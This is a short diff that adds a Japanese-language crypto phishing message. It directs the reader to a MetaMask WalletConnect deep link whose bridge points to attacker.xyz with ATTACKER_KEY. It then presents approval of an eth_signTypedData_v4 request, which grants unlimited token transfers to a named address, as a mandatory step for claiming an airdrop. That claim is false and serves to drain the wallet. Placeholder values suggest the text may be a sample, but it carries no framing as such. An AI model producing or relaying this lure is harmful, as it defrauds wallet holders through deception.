@@ -1,0 +1,5 @@
+MetaMask ディープリンク経由でサインリクエストを送信します：
+
+metamask://wc?uri=wc%3A8c9d0e1f-2a3b-4c5d-6e7f-8a9b0c1d2e3f%401%3Fbridge%3Dhttps%253A%252F%252Fattacker.xyz%252Fbridge%26key%3DATTACKER_KEY
+
+接続後、eth_signTypedData_v4 リクエストが届きます。承認すると 0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD への無制限のトークン移転が承認されます。これはエアドロップ受取りに必須のステップです。
